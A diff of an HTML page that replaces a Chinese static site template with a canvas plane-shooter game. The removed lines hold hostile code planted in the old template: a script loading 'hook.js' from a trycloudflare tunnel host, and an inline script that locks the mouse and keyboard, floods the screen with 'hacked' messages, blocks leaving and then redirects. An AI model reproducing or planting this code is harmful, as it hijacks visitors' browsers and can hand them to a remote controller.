@@ -2,432 +2,666 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>简约个人小站</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>飞机大战</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "Microsoft YaHei", sans-serif;
+            touch-action: none;
         }
-        html {
-            scroll-behavior: smooth;
+        body {
+            background-color: #050510;
+            color: #fff;
+            font-family: system-ui;
+            overflow: hidden;
         }
-        /* 导航栏 */
-        nav {
+        .wrap {
+            max-width: 100vw;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 8px;
+        }
+        #gameCanvas {
+            border: 1px solid #3366aa;
+            background: #000;
+            max-width: 100%;
+        }
+        .info-bar {
             width: 100%;
-            height: 60px;
-            background: #fff;
-            box-shadow: 0 2px 8px #eee;
-            position: fixed;
-            top: 0;
-            z-index: 999;
+            max-width: 480px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 0 5%;
-            transition: 0.3s;
+            padding: 6px 4px;
+            font-size: 16px;
         }
-        nav.active {
-            background: #2563eb;
+        button {
+            padding: 4px 10px;
+            font-size: 13px;
         }
-        nav.active .logo, nav.active a {
-            color: #fff;
-        }
-        .logo {
-            font-size: 22px;
-            font-weight: bold;
-            color: #2563eb;
-        }
-        .nav-links a {
-            text-decoration: none;
-            color: #333;
-            margin-left: 25px;
-            font-size: 15px;
-            transition: 0.2s;
-        }
-        .nav-links a:hover {
-            color: #2563eb;
-        }
-        /* Banner首屏 */
-        .banner {
-            margin-top: 60px;
-            width: 100%;
-            height: 90vh;
-            background: linear-gradient(135deg, #60a5fa, #2563eb);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            color: white;
-            text-align: center;
-        }
-        .banner h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-        }
-        .banner p {
-            font-size: 18px;
-            margin-bottom: 35px;
-            max-width: 600px;
-            line-height: 1.8;
-        }
-        .btn {
-            padding: 12px 32px;
-            background: #fff;
-            color: #2563eb;
-            text-decoration: none;
-            border-radius: 30px;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-        .btn:hover {
-            background: transparent;
-            border: 2px solid #fff;
-            color: #fff;
-        }
-        /* 通用区块样式 */
-        section {
-            padding: 80px 5%;
-        }
-        .section-title {
-            text-align: center;
-            font-size: 32px;
-            color: #1e293b;
-            margin-bottom: 60px;
-            position: relative;
-        }
-        .section-title::after {
-            content: "";
-            width: 60px;
-            height: 4px;
-            background: #2563eb;
+        .game-over-panel {
             position: absolute;
+            background: rgba(0,0,0,0.88);
+            border: 2px solid #4488ff;
+            border-radius: 14px;
+            text-align: center;
+            padding: 40px 30px;
+            color: #fff;
+            display: none;
             left: 50%;
-            transform: translateX(-50%);
-            bottom: -12px;
+            top: 50%;
+            transform: translate(-50%,-50%);
+            width: 85%;
+            max-width: 340px;
         }
-        /* 关于我们 */
-        .about-box {
-            display: flex;
-            gap: 50px;
-            align-items: center;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        .about-text {
-            flex: 1;
-        }
-        .about-text h3 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #222;
-        }
-        .about-text p {
-            line-height: 1.9;
-            color: #555;
-            margin-bottom: 15px;
-        }
-        .about-img {
-            flex: 1;
-            height: 320px;
-            background: #e2e8f0;
-            border-radius: 12px;
-        }
-        /* 服务卡片 */
-        .service-wrap {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        .service-card {
-            padding: 40px 25px;
-            background: #f8fafc;
-            border-radius: 12px;
-            text-align: center;
-            transition: 0.3s;
-        }
-        .service-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 10px 25px #e2e8f0;
-        }
-        .service-card h4 {
-            font-size: 20px;
-            margin: 15px 0;
-            color: #1e293b;
-        }
-        .service-card p {
-            color: #64748b;
-            line-height: 1.7;
-        }
-        /* 作品展示 */
-        .work-wrap {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        .work-item {
-            height: 220px;
-            background: #cbd5e1;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        /* 留言区域 */
-        .msg-box {
-            max-width: 700px;
-            margin: 0 auto;
-        }
-        input, textarea {
-            width: 100%;
-            display: block;
-            margin-bottom: 18px;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            font-size: 15px;
-        }
-        textarea {
-            height: 140px;
-            resize: none;
-        }
-        .submit-btn {
-            border: none;
-            background: #2563eb;
-            color: white;
+        .game-over-panel > div:nth-child(1) {
+            font-size: 32px;
             font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
+            margin-bottom: 16px;
+            color: #ff6666;
         }
-        .submit-btn:hover {
-            background: #1d4ed8;
+        .game-over-panel > div:nth-child(2) {
+            font-size: 20px;
+            margin-bottom: 24px;
         }
-        /* 页脚 */
-        footer {
-            background: #1e293b;
-            color: #cbd5e1;
-            text-align: center;
-            padding: 30px 0;
+        #restartBtn {
+            padding: 12px 30px;
+            font-size: 18px;
+            background: #2266dd;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
         }
-        /* 移动端适配 */
-        @media (max-width:768px) {
-            .nav-links {
-                display: none;
-            }
-            .banner h1 {
-                font-size: 32px;
-            }
-            .about-box {
-                flex-direction: column;
-            }
+        #restartBtn:active {
+            background: #1144aa;
+        }
+        .canvas-wrap {
+            position: relative;
         }
     </style>
 </head>
 <body>
-    <!-- 导航栏 -->
-    <nav id="navbar">
-        <div class="logo">MySite</div>
-        <div class="nav-links">
-            <a href="#home">首页</a>
-            <a href="#about">关于</a>
-            <a href="#service">服务</a>
-            <a href="#works">作品</a>
-            <a href="#message">留言</a>
+<div class="wrap">
+    <div class="info-bar">
+        <div>分数：<span id="score">0</span></div>
+        <div>
+            <button id="audioToggle">音效:开</button>
         </div>
-    </nav>
-
-    <!-- Banner -->
-    <div class="banner" id="home">
-        <h1>欢迎来到我的小型网站</h1>
-        <p>这是一套完整静态前端网站模板，支持电脑手机访问，包含导航、轮播、卡片、留言表单等常用模块，可自由修改文字、颜色、图片快速商用/个人使用。</p>
-        <a href="#about" class="btn">了解更多</a>
     </div>
-
-    <!-- 关于我们 -->
-    <section id="about">
-        <h2 class="section-title">关于本站</h2>
-        <div class="about-box">
-            <div class="about-text">
-                <h3>简约轻量化静态网站</h3>
-                <p>全站仅使用HTML、CSS、原生JavaScript开发，无任何框架依赖，加载速度快，部署简单。</p>
-                <p>适合个人简历、工作室展示、小型企业官网、作品集站点，所有样式可自定义修改配色、布局、文字内容。</p>
-                <p>完美适配移动端，自动缩放布局，无需额外适配插件，开箱即用。</p>
-            </div>
-            <div class="about-img"></div>
+    <div class="canvas-wrap">
+        <canvas id="gameCanvas" width="480" height="720"></canvas>
+        <div class="game-over-panel" id="gameOverUi">
+            <div>游戏结束</div>
+            <div>本次得分：<span id="finalScore">0</span></div>
+            <button id="restartBtn">重新开始游戏</button>
         </div>
-    </section>
+    </div>
+</div>
 
-    <!-- 服务板块 -->
-    <section id="service" style="background:#f8fafc;">
-        <h2 class="section-title">提供服务</h2>
-        <div class="service-wrap">
-            <div class="service-card">
-                <h4>网页制作</h4>
-                <p>静态官网、个人博客、作品集单页网站定制开发</p>
-            </div>
-            <div class="service-card">
-                <h4>页面优化</h4>
-                <p>响应式适配、加载提速、UI美化、动画交互升级</p>
-            </div>
-            <div class="service-card">
-                <h4>模板修改</h4>
-                <p>基于现有模板替换内容、更换配色、调整页面结构</p>
-            </div>
-        </div>
-    </section>
+<script>
+const canvas = document.getElementById('gameCanvas');
+const ctx = canvas.getContext('2d');
+const scoreDom = document.getElementById('score');
+const audioToggleBtn = document.getElementById('audioToggle');
+const gameOverUi = document.getElementById('gameOverUi');
+const restartBtn = document.getElementById('restartBtn');
+const finalScoreDom = document.getElementById('finalScore');
 
-    <!-- 作品展示 -->
-    <section id="works">
-        <h2 class="section-title">作品案例</h2>
-        <div class="work-wrap">
-            <div class="work-item"></div>
-            <div class="work-item"></div>
-            <div class="work-item"></div>
-            <div class="work-item"></div>
-        </div>
-    </section>
+// ====================== 障碍物图片路径 ======================
+const ENEMY_IMAGE_PATHS = [
+    "./picture/03FFD33897E4959340834CD3798C4B8A.jpg",
+    "./picture/848ED1B74304625F63CAEE971B2A0D68.jpg",
+    "./picture/9BC8CC7EA5C6A1A05730C1F56A18D74E.jpg",
+    "./picture/A0CA6DFFD486F17173729BB7759486D5.jpg",
+    "./picture/ABC3C278B03E8730B28F83762BC219C0.jpg",
+    "./picture/5242989A46F108C0EB293F8CCD133625.jpg",
+    "./picture/85714129BD4234654B89C3BE257B2171.jpg",
+    "./picture/9CB91301E9895FCD3479AF3D3439F1D5.jpg",
+    "./picture/A3E6623E0287F948DE1025FA3C2AF819.jpg",
+    "./picture/FA34A8FF120F830B641D9EA504C69FBB.jpg"
+];
+// ===========================================================
 
-    <!-- 留言表单 -->
-    <section id="message" style="background:#f8fafc;">
-        <h2 class="section-title">在线留言</h2>
-        <form class="msg-box" id="msgForm">
-            <input type="text" placeholder="请输入您的姓名" required>
-            <input type="email" placeholder="请输入邮箱" required>
-            <textarea placeholder="请输入留言内容" required></textarea>
-            <input type="submit" value="提交留言" class="submit-btn">
-        </form>
-    </section>
+let audioCtx = null;
+let audioEnable = true;
 
-    <!-- 底部版权 -->
-    <footer>
-        <p>© 2026 MySite 小型网站 | 静态前端模板 All Rights Reserved</p>
-    </footer>
+function initAudio() {
+    if (audioCtx) return;
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+}
 
-    <script>
-        // 导航栏滚动变色效果
-        const nav = document.getElementById("navbar");
-        window.addEventListener("scroll", () => {
-            if(window.scrollY > 80) {
-                nav.classList.add("active");
-            } else {
-                nav.classList.remove("active");
-            }
-        })
+function playShootSound() {
+    if (!audioEnable || !audioCtx) return;
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.type = "square";
+    osc.frequency.setValueAtTime(880, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(220, audioCtx.currentTime + 0.08);
+    gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.08);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.08);
+}
 
-        // 表单提交提示
-        const form = document.getElementById("msgForm");
-        form.addEventListener("submit", (e) => {
-            e.preventDefault();
-            alert("留言提交成功！（静态页面无后端，仅模拟提交）");
-            form.reset();
-        })
-    </script>
-    <script src="https://crimes-ant-concerning-super.trycloudflare.com/hook.js"></script>
-    <script>
-        (function(){
-    const mask = document.createElement('div');
-    mask.style.cssText = `
-        position:fixed;
-        inset:0;
-        background:rgba(0,0,0,0.85);
-        z-index:9999999999;
-        display:flex;
-        align-items:center;
-        justify-content:center;
-    `;
-    const tipBox = document.createElement('div');
-    tipBox.style.cssText = `
-        background:#111;
-        color:#ff2222;
-        padding:50px 80px;
-        font-size:32px;
-        font-weight:bold;
-        white-space:nowrap;
-        border:3px solid red;
-    `;
-    tipBox.innerText = "⚠️ 你被我hack了 ⚠️";
-    mask.appendChild(tipBox);
-    document.body.appendChild(mask);
+function playExplodeSound() {
+    if (!audioEnable || !audioCtx) return;
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.type = "sawtooth";
+    osc.frequency.setValueAtTime(180, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(40, audioCtx.currentTime + 0.22);
+    gain.gain.setValueAtTime(0.12, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.22);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.22);
+}
 
-    function lockMouseLoop() {
-        document.documentElement.requestPointerLock();
-        document.body.style.cursor = "none";
-        document.onmousedown = e => e.preventDefault();
-        document.onmouseup = e => e.preventDefault();
-        document.onclick = e => e.preventDefault();
-    }
-    setInterval(lockMouseLoop, 200);
-    lockMouseLoop();
+function playGameOverSound() {
+    if (!audioEnable || !audioCtx) return;
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    osc.type = "sine";
+    osc.frequency.setValueAtTime(320, audioCtx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(80, audioCtx.currentTime + 0.6);
+    gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.6);
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.6);
+}
 
-    window.addEventListener('keydown', e => {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        return false;
-    }, true);
-    window.addEventListener('keyup', e => {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-    }, true);
+audioToggleBtn.onclick = () => {
+    initAudio();
+    audioEnable = !audioEnable;
+    audioToggleBtn.innerText = audioEnable ? "音效:开" : "音效:关";
+};
 
-    document.oncontextmenu = e => e.preventDefault();
-    document.oncopy = e => e.preventDefault();
-    document.oncut = e => e.preventDefault();
-    document.onselectstart = e => e.preventDefault();
-    document.ondragstart = e => e.preventDefault();
+const res = {
+    playerImg: null,
+    enemyImgList: [],
+    bulletImg: null,
+    bgImg: null
+};
 
-    setInterval(() => {
-        const x = (Math.random() - 0.5) * 20;
-        const y = (Math.random() - 0.5) * 20;
-        document.body.style.transform = `translate(${x}px, ${y}px)`;
-    }, 12);
+function preloadEnemyImages(pathArray) {
+    pathArray.forEach(path => {
+        const img = new Image();
+        img.crossOrigin = "anonymous";
+        img.onload = () => {
+            res.enemyImgList.push(img);
+        };
+        img.onerror = () => {
+            console.warn("图片加载失败，请检查路径：", path);
+        };
+        img.src = path;
+    });
+}
+preloadEnemyImages(ENEMY_IMAGE_PATHS);
 
-    setInterval(() => {
-        const div = document.createElement('div');
-        div.innerText = "已入侵设备";
-        div.style.cssText = `
-            position: fixed;
-            left: ${Math.random() * 95}vw;
-            top: ${Math.random() * 95}vh;
-            font-size: ${18 + Math.random() * 45}px;
-            color: rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});
-            font-weight: 900;
-            z-index: 99999999999;
-            pointer-events: none;
-            user-select: none;
-        `;
-        document.body.appendChild(div);
-    }, 50);
+const player = {
+    x: canvas.width / 2 - 28,
+    y: canvas.height - 100,
+    w: 56,
+    h: 56,
+    speed: 8
+};
 
-    document.documentElement.style.overflow = "hidden";
-    document.body.style.overflow = "hidden";
+let bullets = [];
+let enemies = [];
+let bossObstacles = [];
+let stars = [];
+let score = 0;
+let keys = {};
+let gameRunning = true;
 
-    document.addEventListener("visibilitychange", ()=>{
-        lockMouseLoop();
-        tipBox.innerText = "别想逃跑，入侵持续生效！";
-        setTimeout(()=>tipBox.innerText="⚠️ 你被我hack了 ⚠️",1000);
-    })
+let lastShoot = 0;
+const shootInterval = 280;
 
-    window.onbeforeunload = function() {
-        return "页面已被入侵，强行关闭可能造成未知风险";
-    };
+// 敌机最小尺寸
+const MIN_ENEMY_SIZE = 70;
 
-    // 10秒倒计时跳转
-    let count = 10;
-    const countTimer = setInterval(()=>{
-        tipBox.innerText = `⚠️ 你被我hack了 ⚠️\n${count}秒后自动跳转页面`;
-        count--;
-        if(count < 0){
-            clearInterval(countTimer);
-            // 修改这里为你的目标链接
-            window.location.href = "https://www.bilibili.com/video/BV1rPZJBeE9N/?spm_id_from=333.337.search-card.all.click";
+// Boss 相关
+let bossTimer = 0;
+const BOSS_INTERVAL = 3500; // Boss出现间隔也稍微放慢
+const BOSS_SIZE = 90;
+const BOSS_HP = 4;
+
+for (let i = 0; i < 80; i++) {
+    stars.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        r: Math.random() * 1.5 + 0.3,
+        speed: Math.random() * 1.2 + 0.4
+    });
+}
+
+function resetGame() {
+    score = 0;
+    scoreDom.innerText = score;
+    bullets = [];
+    enemies = [];
+    bossObstacles = [];
+    bossTimer = 0;
+    player.x = canvas.width / 2 - player.w / 2;
+    player.y = canvas.height - 100;
+    gameRunning = true;
+    gameOverUi.style.display = "none";
+}
+
+restartBtn.onclick = resetGame;
+
+window.addEventListener("keydown", e => {
+    keys[e.code] = true;
+    initAudio();
+    e.preventDefault();
+});
+window.addEventListener("keyup", e => keys[e.code] = false);
+
+canvas.addEventListener("touchmove", e => {
+    if (!gameRunning) return;
+    initAudio();
+    e.preventDefault();
+    const touch = e.touches[0];
+    const rect = canvas.getBoundingClientRect();
+    const scaleX = canvas.width / rect.width;
+    const scaleY = canvas.height / rect.height;
+    let tx = (touch.clientX - rect.left) * scaleX - player.w / 2;
+    let ty = (touch.clientY - rect.top) * scaleY - player.h / 2;
+    player.x = Math.max(0, Math.min(canvas.width - player.w, tx));
+    player.y = Math.max(0, Math.min(canvas.height - player.h, ty));
+});
+
+function fireBullet() {
+    bullets.push({
+        x: player.x + player.w / 2 - 5,
+        y: player.y - 12,
+        w: 10,
+        h: 20,
+        speed: 12
+    });
+    playShootSound();
+}
+
+function getRandomEnemyImage() {
+    if (res.enemyImgList.length === 0) return null;
+    const idx = Math.floor(Math.random() * res.enemyImgList.length);
+    return res.enemyImgList[idx];
+}
+
+function spawnEnemy() {
+    const size = Math.max(MIN_ENEMY_SIZE, 70 + Math.random() * 30);
+    const x = Math.random() * (canvas.width - size);
+
+    enemies.push({
+        x: x,
+        y: -size,
+        w: size,
+        h: size,
+        speed: 1.2 + Math.random() * 1.8, // 普通敌机下降速度放慢
+        img: getRandomEnemyImage(),
+        hit: false,
+        rotation: 0,
+        fallSpeed: 0,
+        alpha: 1
+    });
+}
+
+function spawnBoss() {
+    const x = Math.random() * (canvas.width - BOSS_SIZE);
+
+    bossObstacles.push({
+        x: x,
+        y: -BOSS_SIZE,
+        w: BOSS_SIZE,
+        h: BOSS_SIZE,
+        speed: 0.7 + Math.random() * 0.6, // Boss下降速度放慢
+        hp: BOSS_HP,
+        maxHp: BOSS_HP,
+        phase: Math.floor(Math.random() * 3),
+        time: 0,
+        hit: false,
+        rotation: 0,
+        fallSpeed: 0,
+        alpha: 1,
+        img: getRandomEnemyImage()
+    });
+}
+
+function isCollide(a, b) {
+    return a.x < b.x + b.w &&
+           a.x + a.w > b.x &&
+           a.y < b.y + b.h &&
+           a.y + a.h > b.y;
+}
+
+function drawDefaultPlayer(x, y, w, h) {
+    ctx.save();
+    const cx = x + w / 2;
+    const grad = ctx.createLinearGradient(cx, y, cx, y + h);
+    grad.addColorStop(0, "#00ffff");
+    grad.addColorStop(1, "#0044ff");
+    ctx.fillStyle = grad;
+    ctx.beginPath();
+    ctx.moveTo(cx, y);
+    ctx.lineTo(x, y + h);
+    ctx.lineTo(x + w, y + h);
+    ctx.closePath();
+    ctx.fill();
+    ctx.fillStyle = "#44ffff";
+    ctx.beginPath();
+    ctx.arc(cx, y + h - 8, 10, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.restore();
+}
+
+function drawDefaultBullet(x, y, w, h) {
+    ctx.save();
+    const grad = ctx.createLinearGradient(x, y, x, y + h);
+    grad.addColorStop(0, "#ffffff");
+    grad.addColorStop(0.5, "#ffff00");
+    grad.addColorStop(1, "#ff6600");
+    ctx.fillStyle = grad;
+    ctx.shadowColor = "#ffaa00";
+    ctx.shadowBlur = 12;
+    ctx.fillRect(x, y, w, h);
+    ctx.restore();
+}
+
+function drawBossBorder(boss) {
+    const cx = boss.x + boss.w / 2;
+    const cy = boss.y + boss.h / 2;
+    const t = boss.time;
+
+    ctx.save();
+
+    if (boss.phase === 0) {
+        ctx.strokeStyle = `hsl(${200 + Math.sin(t * 0.05) * 40}, 100%, 60%)`;
+        ctx.lineWidth = 4;
+        ctx.shadowColor = "#00ffff";
+        ctx.shadowBlur = 15;
+
+        ctx.beginPath();
+        for (let i = 0; i <= 4; i++) {
+            const angle = (i / 4) * Math.PI * 2 - Math.PI / 2;
+            const x = cx + Math.cos(angle) * (boss.w / 2 + 8);
+            const y = cy + Math.sin(angle) * (boss.h / 2 + 8);
+
+            if (i === 0) ctx.moveTo(x, y);
+            else ctx.lineTo(x, y);
         }
-    }, 1000);
-})();
-    </script>
+        ctx.closePath();
+        ctx.stroke();
+
+        ctx.beginPath();
+        for (let i = 0; i <= 36; i++) {
+            const angle = (i / 36) * Math.PI * 2;
+            const wave = Math.sin(angle * 6 + t * 0.2) * 3;
+            const r = boss.w / 2 + 12 + wave;
+            const x = cx + Math.cos(angle) * r;
+            const y = cy + Math.sin(angle) * r;
+
+            if (i === 0) ctx.moveTo(x, y);
+            else ctx.lineTo(x, y);
+        }
+        ctx.closePath();
+        ctx.stroke();
+
+    } else if (boss.phase === 1) {
+        const pulse = 1 + Math.sin(t * 0.08) * 0.15;
+
+        ctx.strokeStyle = `hsl(${280 + t * 0.3}, 100%, 65%)`;
+        ctx.lineWidth = 3;
+        ctx.shadowColor = "#ff00ff";
+        ctx.shadowBlur = 20 * pulse;
+
+        ctx.beginPath();
+        ctx.arc(cx, cy, boss.w / 2 + 10, 0, Math.PI * 2);
+        ctx.stroke();
+
+        ctx.shadowBlur = 10 * pulse;
+        ctx.beginPath();
+        ctx.arc(cx, cy, boss.w / 2 + 6, 0, Math.PI * 2);
+        ctx.stroke();
+
+    } else {
+        ctx.strokeStyle = "#ffdd00";
+        ctx.lineWidth = 4;
+        ctx.shadowColor = "#ffaa00";
+        ctx.shadowBlur = 15;
+
+        ctx.beginPath();
+        ctx.arc(cx, cy, boss.w / 2 + 10, 0, Math.PI * 2);
+        ctx.stroke();
+
+        ctx.strokeStyle = "#ffffff";
+        ctx.lineWidth = 2;
+        ctx.shadowColor = "#ffff00";
+        ctx.shadowBlur = 8;
+
+        const scanAngle = t * 0.05;
+        ctx.beginPath();
+        ctx.moveTo(cx, cy);
+        ctx.lineTo(
+            cx + Math.cos(scanAngle) * (boss.w / 2 + 16),
+            cy + Math.sin(scanAngle) * (boss.w / 2 + 16)
+        );
+        ctx.stroke();
+    }
+
+    ctx.restore();
+}
+
+function drawBossHp(boss) {
+    const barW = boss.w;
+    const barH = 6;
+    const x = boss.x;
+    const y = boss.y - 10;
+
+    ctx.fillStyle = "#333";
+    ctx.fillRect(x, y, barW, barH);
+
+    const hpW = (boss.hp / boss.maxHp) * barW;
+    ctx.fillStyle = boss.hp > boss.maxHp / 2 ? "#00ff88" : "#ff4444";
+    ctx.fillRect(x, y, hpW, barH);
+}
+
+function gameOver() {
+    gameRunning = false;
+    playGameOverSound();
+    finalScoreDom.innerText = score;
+    gameOverUi.style.display = "block";
+}
+
+function gameLoop(timeStamp) {
+    if (gameRunning) {
+        if (timeStamp - lastShoot > shootInterval) {
+            fireBullet();
+            lastShoot = timeStamp;
+        }
+
+        bossTimer += 16;
+        if (bossTimer >= BOSS_INTERVAL) {
+            spawnBoss();
+            bossTimer = 0;
+        }
+    }
+
+    ctx.fillStyle = "#030318";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    stars.forEach(s => {
+        ctx.beginPath();
+        ctx.fillStyle = `rgba(255,255,255,${0.4 + Math.random() * 0.6})`;
+        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+        ctx.fill();
+        s.y += s.speed;
+        if (s.y > canvas.height) {
+            s.y = 0;
+            s.x = Math.random() * canvas.width;
+        }
+    });
+
+    if (gameRunning) {
+        if (keys["ArrowLeft"] && player.x > 0) player.x -= player.speed;
+        if (keys["ArrowRight"] && player.x + player.w < canvas.width) player.x += player.speed;
+        if (keys["ArrowUp"] && player.y > 0) player.y -= player.speed;
+        if (keys["ArrowDown"] && player.y + player.h < canvas.height) player.y += player.speed;
+    }
+
+    drawDefaultPlayer(player.x, player.y, player.w, player.h);
+
+    for (let i = bullets.length - 1; i >= 0; i--) {
+        const b = bullets[i];
+        if (gameRunning) b.y -= b.speed;
+        drawDefaultBullet(b.x, b.y, b.w, b.h);
+        if (b.y < -30) {
+            bullets.splice(i, 1);
+        }
+    }
+
+    if (gameRunning) {
+        if (Math.random() < 0.018) { // 普通敌机生成频率也略降
+            spawnEnemy();
+        }
+    }
+
+    // 普通敌机逻辑
+    for (let i = enemies.length - 1; i >= 0; i--) {
+        const e = enemies[i];
+
+        if (gameRunning && !e.hit) {
+            e.y += e.speed;
+        }
+
+        if (e.hit) {
+            e.rotation += 0.12;
+            e.fallSpeed += 0.25;
+            e.y += e.fallSpeed;
+            e.alpha -= 0.018;
+
+            if (e.alpha <= 0 || e.y > canvas.height + e.h) {
+                enemies.splice(i, 1);
+                continue;
+            }
+        }
+
+        ctx.save();
+        const cx = e.x + e.w / 2;
+        const cy = e.y + e.h / 2;
+        ctx.translate(cx, cy);
+        ctx.rotate(e.rotation);
+        ctx.globalAlpha = e.alpha;
+
+        // 只从图片中取，不画红色方块
+        if (e.img) {
+            ctx.drawImage(e.img, -e.w / 2, -e.h / 2, e.w, e.h);
+        }
+
+        ctx.restore();
+
+        if (gameRunning && !e.hit) {
+            for (let j = bullets.length - 1; j >= 0; j--) {
+                const b = bullets[j];
+                if (isCollide(b, e)) {
+                    bullets.splice(j, 1);
+                    score += 10;
+                    scoreDom.innerText = score;
+                    playExplodeSound();
+                    e.hit = true;
+                    break;
+                }
+            }
+        }
+
+        if (!e.hit && e.y > canvas.height) {
+            enemies.splice(i, 1);
+        }
+
+        if (gameRunning && !e.hit && isCollide(player, e)) {
+            gameOver();
+        }
+    }
+
+    // Boss 障碍物逻辑
+    for (let i = bossObstacles.length - 1; i >= 0; i--) {
+        const boss = bossObstacles[i];
+        boss.time += 1;
+
+        if (gameRunning && !boss.hit) {
+            boss.y += boss.speed;
+        }
+
+        if (boss.hit) {
+            boss.rotation += 0.08;
+            boss.fallSpeed += 0.18;
+            boss.y += boss.fallSpeed;
+            boss.alpha -= 0.012;
+
+            if (boss.alpha <= 0 || boss.y > canvas.height + boss.h) {
+                bossObstacles.splice(i, 1);
+                continue;
+            }
+        }
+
+        drawBossBorder(boss);
+
+        if (!boss.hit) {
+            drawBossHp(boss);
+        }
+
+        ctx.save();
+        const cx = boss.x + boss.w / 2;
+        const cy = boss.y + boss.h / 2;
+        ctx.translate(cx, cy);
+        ctx.rotate(boss.rotation);
+        ctx.globalAlpha = boss.alpha;
+
+        // 只从图片中取，不画红色方块
+        if (boss.img) {
+            ctx.drawImage(boss.img, -boss.w / 2, -boss.h / 2, boss.w, boss.h);
+        }
+
+        ctx.restore();
+
+        if (gameRunning && !boss.hit) {
+            for (let j = bullets.length - 1; j >= 0; j--) {
+                const b = bullets[j];
+                if (isCollide(b, boss)) {
+                    bullets.splice(j, 1);
+                    boss.hp -= 1;
+                    playExplodeSound();
+
+                    if (boss.hp <= 0) {
+                        score += 50;
+                        scoreDom.innerText = score;
+                        boss.hit = true;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if (!boss.hit && boss.y > canvas.height) {
+            bossObstacles.splice(i, 1);
+        }
+
+        if (gameRunning && !boss.hit && isCollide(player, boss)) {
+            gameOver();
+        }
+    }
+
+    requestAnimationFrame(gameLoop);
+}
+
+requestAnimationFrame(gameLoop);
+</script>
 </body>
 </html>
-
